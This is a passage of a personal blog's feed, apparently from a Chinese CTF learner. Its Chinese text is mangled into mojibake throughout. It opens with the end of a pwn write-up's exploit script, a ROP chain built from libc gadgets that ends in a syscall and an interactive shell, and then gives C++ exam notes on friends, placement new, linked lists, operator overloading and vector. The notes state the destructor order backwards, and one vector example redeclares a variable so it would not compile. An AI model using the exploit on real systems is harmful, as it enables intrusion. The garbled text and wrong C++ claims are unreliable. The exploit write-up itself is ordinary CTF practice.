ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfae7</span>) <span class="comment"># add rax, 2 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x000002284d</span>) <span class="comment"># syscall</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Leave your message:\n&quot;</span>)</span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å› ä¸ºä»–çš„å­—ç¬¦æ˜¯0x200é™åˆ¶çš„å› æ­¤è¦ç¼©çŸ­ä¸€ä¸‹ï¼ˆä¸æ˜¯pop raxç”¨ä¸èµ·ï¼Œè€Œæ˜¯addæ›´æœ‰feelingï¼ˆbushi</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åˆ·é¢˜è®°å½•1&quot;&gt;&lt;a href=&quot;#åˆ·é¢˜è®°å½•1&quot; class=&quot;headerlink&quot; title=&quot;åˆ·é¢˜è®°å½•1&quot;&gt;&lt;/a&gt;åˆ·é¢˜è®°å½•1&lt;/h1&gt;&lt;p&gt;å› ä¸ºå›½èµ›å°†è¿‘ï¼Œå¼€å§‹æ¯å¤©å‡ é“é¢˜ï¼Œéš¾åº¦ä¸ç­‰ï¼Œä¹‹åä¼šæœ‰patchçš„ä½¿ç”¨ï¼ˆç®—æ˜¯é¢„å‘Šå’ŒDIR-815çš„å¤ç°ï¼ˆæ—©å°±å¤ç°ä¸€ç›´æ²¡æ—¶é—´</summary>
      
    
    
    
    <category term="åšé¢˜è®°å½•" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>C + +é‚£å¹´é‚£äº›äº‹</title>
    <link href="http://s1nec-1o.github.io/2024/05/10/C-%E9%82%A3%E5%B9%B4%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://s1nec-1o.github.io/2024/05/10/C-%E9%82%A3%E5%B9%B4%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2024-05-10T13:17:14.000Z</published>
    <updated>2024-05-11T07:38:33.272Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬ç¯‡blogæ˜¯è¯»è€…æ‰€æ€»ç»“ï¼ˆcvå¤§æ³•å‡æœ‰åŒ…å«å‡ºå¤„ï¼Œç¬”è€…æ°´å¹³æœ‰é™ï¼Œå¦‚æœé”™è¯¯è¯·æŒ‡å‡ºï¼ˆä¸»è¦æœŸæœ«è€ƒæ€»ç»“äº†ä¸€ä¸‹æ–¹ä¾¿è€ƒå‰å†æ¬¡å¤ä¹ </p><h2 id="ç†è®ºåŸºç¡€"><a href="#ç†è®ºåŸºç¡€" class="headerlink" title="ç†è®ºåŸºç¡€"></a>ç†è®ºåŸºç¡€</h2><p>åœ¨protectedä¿æŠ¤ç»§æ‰¿ä¸­ï¼Œå¯¹äºå‚ç›´è®¿é—®ç­‰åŒäºå…¬æœ‰ç»§æ‰¿ï¼Œå¯¹äºæ°´å¹³è®¿é—®ç­‰åŒäºç§æœ‰ç»§æ‰¿ã€‚</p><p>åŠ¨æ€ç»‘å®šæ˜¯åœ¨è¿è¡Œæ—¶é€‰å®šè°ƒç”¨çš„æˆå‘˜å‡½æ•°çš„ã€‚</p><p>å¯¹äºä»åŸºç±»ç»§æ‰¿çš„è™šå‡½æ•°ï¼Œæ´¾ç”Ÿç±»ä¹Ÿå¯ä»¥ä¸è¿›è¡Œé‡å®šä¹‰ã€‚</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405101909241.png" alt="image-20240509235749075" style="zoom:50%;" /><p>ç±»Aæ˜¯ç±»Bçš„å‹å…ƒï¼Œè¯´æ˜ç±»Aæ˜¯å‹å…ƒç±»</p><p>å‹å…ƒä¸èƒ½ä¼ é€’ä¹Ÿä¸èƒ½ç»§æ‰¿ï¼šç ´åå°è£…æ€§</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassB</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassA</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">(<span class="type">const</span> ClassB&amp; b)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassB</span> &#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">ClassA</span>;  <span class="comment">// å£°æ˜ClassAä¸ºå‹å…ƒç±»</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> privateData = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> protectedData = <span class="number">20</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassA::display</span><span class="params">(<span class="type">const</span> ClassB&amp; b)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Private Data: &quot;</span> &lt;&lt; b.privateData &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Protected Data: &quot;</span> &lt;&lt; b.protectedData &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨é”€æ¯æ´¾ç”Ÿç±»å¯¹è±¡æ—¶ï¼Œå…ˆè°ƒç”¨åŸºç±»çš„ææ„å‡½æ•°ï¼Œå†è°ƒç”¨æ´¾ç”Ÿç±»çš„ææ„å‡½æ•°</p><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p><code>new</code>å‡ºæ¥çš„å¯¹è±¡ä»…ä»…æ˜¯è°ƒç”¨å¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œnewä¹‹åè¦æ˜¾ç¤ºçš„è°ƒç”¨deleteå‡½æ•°</p><p><code>palcement new</code>çš„ä¸»è¦ç”¨é€”å°±æ˜¯åå¤ä½¿ç”¨ä¸€å—è¾ƒå¤§çš„åŠ¨æ€åˆ†é…çš„å†…å­˜æ¥æ„é€ ä¸åŒç±»å‹çš„å¯¹è±¡æˆ–è€…ä»–ä»¬çš„æ•°ç»„ã€‚placement newæ„é€ èµ·æ¥çš„å¯¹è±¡æˆ–å…¶æ•°ç»„ï¼Œè¦æ˜¾ç¤ºçš„è°ƒç”¨ä»–ä»¬çš„<a href="https://so.csdn.net/so/search?q=%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">ææ„å‡½æ•°</a>æ¥é”€æ¯ï¼Œåƒä¸‡ä¸è¦ä½¿ç”¨deleteã€‚</p><p>staticä¿®é¥°çš„å¯¹è±¡æ—¶ï¼Œåªæœ‰åœ¨ç¨‹åºç»“æŸæ—¶æ‰ä¼šè°ƒç”¨ææ„å‡½æ•°ï¼Œä½äºmainå‡½æ•°ä¸­å®šä¹‰çš„å¯¹è±¡ä¹‹å</p><h3 id="å‹å…ƒ"><a href="#å‹å…ƒ" class="headerlink" title="å‹å…ƒ"></a>å‹å…ƒ</h3><p>å‹å…ƒçš„å…³é”®å­—ä¸º  <code>friend</code><br>å‹å…ƒçš„ä¸‰ç§å®ç°</p><ol><li>ç±»åšå‹å…ƒ</li><li>æˆå‘˜å‡½æ•°åšå‹å…ƒ</li><li>å…¨å±€å‡½æ•°åšå‹å…ƒ</li></ol><ul><li><p>friendä¿®é¥°åˆ«çš„ç±»</p><ul><li><p>å‹å…ƒç±»å¯ä»¥å£°æ˜åœ¨ç±»ä¸­ä»»æ„ä½ç½®ã€‚<code>friend class ç±»å</code></p></li><li><p>å£°æ˜å‹å…ƒç±»ä¹‹åï¼Œå‹å…ƒç±»ä¸­çš„æ‰€æœ‰æˆå‘˜å‡½æ•°éƒ½æ˜¯è¯¥ç±»çš„å‹å…ƒå‡½æ•°ï¼Œèƒ½å¤Ÿè®¿é—®è¯¥ç±»çš„æ‰€æœ‰æˆå‘˜ã€‚</p></li></ul></li><li><p>friendä¿®é¥°æˆå‘˜å‡½æ•°</p><ul><li><p>å‹å…ƒæˆå‘˜å‡½æ•°å£°æ˜è¯­æ³•ï¼š<code>friend å‡½æ•°è¿”å›å€¼ç±»å‹ ç±»å::å‡½æ•°å();</code></p></li><li><p>æ³¨æ„å®šä¹‰çš„å…ˆåï¼Œå»ºè®®åœ¨å‰é¢è¿›è¡Œå£°æ˜ï¼Œåé¢è¿›è¡Œå‡½æ•°çš„åŒä¸€å®šä¹‰ï¼Œé˜²æ­¢å‡ºç°é—®é¢˜ã€‚</p></li></ul></li><li><p>friendä¿®é¥°ç±»å¤–å®šä¹‰çš„å‡½æ•°</p><ul><li><p>å°†ç±»å¤–éƒ¨çš„æ™®é€šå‡½æ•°ä½œä¸ºç±»çš„å‹å…ƒå‡½æ•°ï¼Œåœ¨ç±»ä¸­ä½¿ç”¨friendå…³é”®å­—å£°æ˜è¯¥æ™®é€šå‡½æ•°å°±å¯ä»¥å®ç°ï¼Œå‹å…ƒå‡½æ•°å¯ä»¥åœ¨ç±»ä¸­ä»»æ„ä½ç½®å£°æ˜ã€‚</p></li><li><p>æ™®é€šå‡½æ•°ä½œä¸ºå‹å…ƒå‡½æ•°çš„å£°æ˜å½¢å¼å¦‚ä¸‹æ‰€ç¤ºï¼š <code>friend å‡½æ•°è¿”å›å€¼ç±»å‹ å‹å…ƒå‡½æ•°åï¼ˆå½¢å‚åˆ—è¡¨ï¼‰</code></p></li></ul></li></ul><h3 id="é“¾è¡¨"><a href="#é“¾è¡¨" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h3><p>é“¾è¡¨ç¡®å®æ˜¯ä¸€ç§é‡è¦çš„åŠ¨æ€æ•°æ®ç»“æ„ï¼Œå®ƒåœ¨è®¸å¤šæƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œä½†æ‚¨çš„æè¿°ä¸­æœ‰å‡ ç‚¹éœ€è¦æ¾„æ¸…å’Œä¿®æ­£ï¼š</p><ol><li><strong>åŠ¨æ€å†…å­˜åˆ†é…</strong>ï¼š é“¾è¡¨ç¡®å®æ ¹æ®éœ€è¦åŠ¨æ€åœ°å¼€è¾Ÿå†…å­˜ç©ºé—´ã€‚æ¯ä¸ªæ–°å…ƒç´ ï¼ˆé€šå¸¸ç§°ä¸ºèŠ‚ç‚¹ï¼‰éƒ½æ˜¯åœ¨éœ€è¦æ—¶åˆ›å»ºçš„ï¼Œè¿™ä½¿å¾—é“¾è¡¨åœ¨å†…å­˜ä½¿ç”¨æ–¹é¢éå¸¸çµæ´»ã€‚</li><li><strong>æ’å…¥å’Œåˆ é™¤çš„çµæ´»æ€§</strong>ï¼š é“¾è¡¨å¯ä»¥åœ¨å‡ ä¹ä»»ä½•ä½ç½®è½»æ¾åœ°æ’å…¥æˆ–åˆ é™¤èŠ‚ç‚¹ã€‚ç”±äºä¸éœ€è¦åƒæ•°ç»„é‚£æ ·ç§»åŠ¨å…ƒç´ ï¼Œè¿™äº›æ“ä½œé€šå¸¸å¾ˆé«˜æ•ˆï¼Œå°¤å…¶æ˜¯å½“ä½ å¯ä»¥ç›´æ¥è®¿é—®åˆ°è¦æ“ä½œçš„èŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹æ—¶ã€‚</li><li><strong>ä¸æ”¯æŒéšæœºè®¿é—®</strong>ï¼š é“¾è¡¨<strong>ä¸æ”¯æŒéšæœºè®¿é—®</strong>ã€‚æ•°ç»„æ”¯æŒé«˜æ•ˆçš„éšæœºè®¿é—®ï¼Œå³å¯ä»¥ç›´æ¥é€šè¿‡ç´¢å¼•åœ¨å¸¸æ•°æ—¶é—´å†…è®¿é—®ä»»ä½•å…ƒç´ ã€‚è€Œé“¾è¡¨åˆ™éœ€è¦ä»å¤´å¼€å§‹éå†ï¼Œç›´åˆ°åˆ°è¾¾æ‰€éœ€çš„å…ƒç´ ï¼Œè¿™ä½¿å¾—è®¿é—®ç‰¹å®šå…ƒç´ æ˜¯çº¿æ€§æ—¶é—´çš„æ“ä½œã€‚</li><li><strong>å†…å­˜å’Œæ“ä½œæ•ˆç‡</strong>ï¼š<ul><li><strong>å†…å­˜ä½¿ç”¨</strong>ï¼šç›¸æ¯”äºæ•°ç»„ï¼Œé“¾è¡¨çš„å†…å­˜ä½¿ç”¨é€šå¸¸æ›´é«˜ï¼Œå› ä¸ºæ¯ä¸ªèŠ‚ç‚¹ä¸ä»…è¦å­˜å‚¨æ•°æ®ï¼Œè¿˜éœ€è¦å­˜å‚¨è‡³å°‘ä¸€ä¸ªæŒ‡å‘åˆ—è¡¨ä¸­ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆã€‚åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œè¿˜éœ€è¦å­˜å‚¨æŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆã€‚</li><li><strong>æ“ä½œæ•ˆç‡</strong>ï¼šé“¾è¡¨çš„æ“ä½œæ•ˆç‡ä¾èµ–äºå…·ä½“æ“ä½œã€‚å¯¹äºåœ¨é“¾è¡¨å¤´éƒ¨æˆ–å·²çŸ¥ä½ç½®æ’å…¥å’Œåˆ é™¤æ“ä½œï¼Œé“¾è¡¨éå¸¸é«˜æ•ˆã€‚ç„¶è€Œï¼Œå¯¹äºéœ€è¦æœç´¢ç‰¹å®šå…ƒç´ çš„æ“ä½œï¼Œé“¾è¡¨çš„æ•ˆç‡é€šå¸¸ä½äºæ•°ç»„ï¼Œå› ä¸ºéœ€è¦éå†é“¾è¡¨å…ƒç´ ã€‚</li></ul></li><li><strong>èŠ‚çœå†…å­˜</strong>ï¼š é“¾è¡¨ä¸ä¸€å®šèƒ½èŠ‚çœå†…å­˜ï¼Œç‰¹åˆ«æ˜¯å½“èŠ‚ç‚¹åŒ…å«çš„æ•°æ®è¾ƒå°æ—¶ï¼Œé¢å¤–çš„æŒ‡é’ˆæ‰€éœ€çš„å†…å­˜å¯èƒ½ä¼šä½¿å¾—é“¾è¡¨çš„æ€»å†…å­˜å ç”¨å®é™…ä¸Šé«˜äºåŒç­‰æ•°é‡çš„æ•°ç»„å…ƒç´ ã€‚</li></ol><h3 id="è¿ç®—ç¬¦é‡è½½"><a href="#è¿ç®—ç¬¦é‡è½½" class="headerlink" title="è¿ç®—ç¬¦é‡è½½"></a>è¿ç®—ç¬¦é‡è½½</h3><p>åœ¨C++ä¸­ï¼Œå¤§å¤šæ•°è¿ç®—ç¬¦å¯ä»¥è¢«é‡è½½ä¸ºæˆå‘˜å‡½æ•°æˆ–éæˆå‘˜å‡½æ•°ï¼ˆåŒ…æ‹¬å‹å…ƒå‡½æ•°ï¼‰ï¼Œä½†å¹¶éæ‰€æœ‰è¿ç®—ç¬¦éƒ½å¯ä»¥ç”¨è¿™ä¸‰ç§æ–¹å¼é‡è½½ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å…³é”®ç‚¹å’Œä¾‹å¤–ï¼š</p><h3 id="æˆå‘˜å‡½æ•°å’Œéæˆå‘˜å‡½æ•°"><a href="#æˆå‘˜å‡½æ•°å’Œéæˆå‘˜å‡½æ•°" class="headerlink" title="æˆå‘˜å‡½æ•°å’Œéæˆå‘˜å‡½æ•°"></a>æˆå‘˜å‡½æ•°å’Œéæˆå‘˜å‡½æ•°</h3><ul><li><strong>æˆå‘˜å‡½æ•°</strong>ï¼šå½“ä¸€ä¸ªè¿ç®—ç¬¦è¢«é‡è½½ä¸ºæˆå‘˜å‡½æ•°æ—¶ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°å¿…é¡»æ˜¯è°ƒç”¨è¯¥æˆå‘˜å‡½æ•°çš„å¯¹è±¡æœ¬èº«ã€‚è¿™æ„å‘³ç€ï¼Œå¯¹äºäºŒå…ƒè¿ç®—ç¬¦ï¼Œå·¦æ“ä½œæ•°æ˜¯å¯¹è±¡æœ¬èº«ï¼Œå³æ“ä½œæ•°æ˜¯ä½œä¸ºå‚æ•°ä¼ é€’çš„ã€‚</li><li><strong>éæˆå‘˜å‡½æ•°</strong>ï¼šè¿™äº›é€šå¸¸è¢«å®ç°ä¸ºæ™®é€šå‡½æ•°æˆ–å‹å…ƒå‡½æ•°ã€‚å‹å…ƒå‡½æ•°è™½ç„¶å®šä¹‰åœ¨ç±»çš„å¤–éƒ¨ï¼Œä½†å®ƒå¯ä»¥è®¿é—®ç±»çš„æ‰€æœ‰ç§æœ‰å’Œä¿æŠ¤æˆå‘˜ã€‚</li></ul><h3 id="å‹å…ƒå‡½æ•°"><a href="#å‹å…ƒå‡½æ•°" class="headerlink" title="å‹å…ƒå‡½æ•°"></a>å‹å…ƒå‡½æ•°</h3><ul><li><strong>å‹å…ƒå‡½æ•°</strong>ï¼šä¸æ˜¯ç±»çš„æˆå‘˜ï¼Œä½†æœ‰æƒè®¿é—®ç±»çš„ç§æœ‰å’Œä¿æŠ¤æˆå‘˜ã€‚å‹å…ƒå‡½æ•°é€šå¸¸ç”¨äºé‚£äº›éœ€è¦è®¿é—®ä¸¤ä¸ªä¸åŒç±»å¯¹è±¡çš„ç§æœ‰æ•°æ®çš„è¿ç®—ç¬¦é‡è½½ã€‚</li></ul><h3 id="ç‰¹æ®Šè¿ç®—ç¬¦é‡è½½"><a href="#ç‰¹æ®Šè¿ç®—ç¬¦é‡è½½" class="headerlink" title="ç‰¹æ®Šè¿ç®—ç¬¦é‡è½½"></a>ç‰¹æ®Šè¿ç®—ç¬¦é‡è½½</h3><ul><li><strong>èµ‹å€¼è¿ç®—ç¬¦ï¼ˆ<code>=</code>ï¼‰</strong>ï¼šåªèƒ½ä½œä¸ºæˆå‘˜å‡½æ•°é‡è½½ã€‚è¿™æ˜¯å› ä¸ºèµ‹å€¼è¿ç®—ç¬¦éœ€è¦æ”¹å˜å¯¹è±¡è‡ªèº«çš„çŠ¶æ€ï¼Œä¸”å·¦ä¾§æ“ä½œæ•°å¿…é¡»æ˜¯ç±»ç±»å‹çš„å¯¹è±¡ã€‚</li><li><strong>ä¸‹æ ‡è¿ç®—ç¬¦ï¼ˆ<code>[]</code>ï¼‰</strong>ã€<strong>å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦ï¼ˆ<code>()</code>ï¼‰</strong>å’Œ<strong>ç®­å¤´è¿ç®—ç¬¦ï¼ˆ<code>-&gt;</code>ï¼‰</strong>ï¼šä¹Ÿåªèƒ½ä½œä¸ºæˆå‘˜å‡½æ•°é‡è½½ã€‚</li><li><strong>é€’å¢ï¼ˆ<code>++</code>ï¼‰</strong>å’Œ<strong>é€’å‡ï¼ˆ<code>--</code>ï¼‰è¿ç®—ç¬¦</strong>ï¼šå¯ä»¥ä½œä¸ºæˆå‘˜å‡½æ•°æˆ–éæˆå‘˜å‡½æ•°é‡è½½ï¼Œä½†é€šå¸¸ä½œä¸ºæˆå‘˜å‡½æ•°é‡è½½ï¼Œä»¥ä¾¿å¯ä»¥ç›´æ¥ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€ã€‚</li></ul><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p>ä¸¾ä¸ªä¾‹å­ï¼Œè€ƒè™‘ä¸€ä¸ªç®€å•çš„ç±»<code>Vector</code>ï¼Œæˆ‘ä»¬å¯ä»¥é‡è½½åŠ æ³•è¿ç®—ç¬¦<code>+</code>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æˆå‘˜å‡½æ•°é‡è½½</span></span><br><span class="line">    Vector <span class="keyword">operator</span>+(<span class="type">const</span> Vector&amp; other) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;x + other.x, y + other.y&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‹å…ƒå‡½æ•°é‡è½½</span></span><br><span class="line">    <span class="keyword">friend</span> Vector <span class="keyword">operator</span>+(<span class="type">const</span> Vector&amp; lhs, <span class="type">const</span> Vector&amp; rhs) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;lhs.x + rhs.x, lhs.y + rhs.y&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒåŠ æ³•è¿ç®—ç¬¦å¯ä»¥ä½œä¸ºæˆå‘˜å‡½æ•°æˆ–éæˆå‘˜å‹å…ƒå‡½æ•°é‡è½½ã€‚é€‰æ‹©å“ªç§æ–¹å¼å–å†³äºå…·ä½“éœ€æ±‚ï¼Œä¾‹å¦‚ï¼Œå¦‚æœéœ€è¦è®¿é—®ä¸¤ä¸ªä¸åŒå¯¹è±¡çš„ç§æœ‰æˆå‘˜ï¼Œåˆ™å¯èƒ½éœ€è¦ä½¿ç”¨å‹å…ƒå‡½æ•°ã€‚</p><h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>è™½ç„¶å¾ˆå¤šè¿ç®—ç¬¦å¯ä»¥ä»¥ä¸åŒæ–¹å¼é‡è½½ï¼Œä½†å¹¶éæ‰€æœ‰è¿ç®—ç¬¦éƒ½å¯ä»¥é€šè¿‡æ‰€æœ‰ä¸‰ç§æ–¹å¼ï¼ˆæˆå‘˜ã€éæˆå‘˜ã€å‹å…ƒï¼‰é‡è½½ã€‚é€‰æ‹©åˆé€‚çš„é‡è½½æ–¹å¼å–å†³äºç‰¹å®šçš„éœ€æ±‚å’Œè®¾è®¡ç›®æ ‡ã€‚</p><h2 id="å®è·µå®ä¾‹"><a href="#å®è·µå®ä¾‹" class="headerlink" title="å®è·µå®ä¾‹"></a>å®è·µå®ä¾‹</h2><h3 id="vectorä½¿ç”¨"><a href="#vectorä½¿ç”¨" class="headerlink" title="vectorä½¿ç”¨"></a>vectorä½¿ç”¨</h3><p>ä¸‹é¢æ˜¯ä¸€äº›<code>vector</code>çš„ç”¨æ³•ç¤ºä¾‹ï¼š</p><p>**åˆ›å»ºå’Œåˆå§‹åŒ–<code>vector</code>**ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªç©ºçš„vector</span></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªå…·æœ‰åˆå§‹å€¼çš„vector</span></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨push_back()é€ä¸ªæ·»åŠ å…ƒç´ </span></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers;</span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨æŒ‡å®šå¤§å°å’Œåˆå§‹å€¼åˆ›å»ºvector</span></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">numbers</span><span class="params">(<span class="number">5</span>, <span class="number">0</span>)</span></span>;  <span class="comment">// åŒ…å«5ä¸ªåˆå§‹å€¼ä¸º0çš„å…ƒç´ </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è®¿é—®å’Œä¿®æ”¹<code>vector</code>ä¸­çš„å…ƒç´ </strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€šè¿‡ä¸‹æ ‡è®¿é—®å…ƒç´ </span></span><br><span class="line">    std::cout &lt;&lt; numbers[<span class="number">0</span>] &lt;&lt; std::endl;  <span class="comment">// è¾“å‡ºï¼š1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 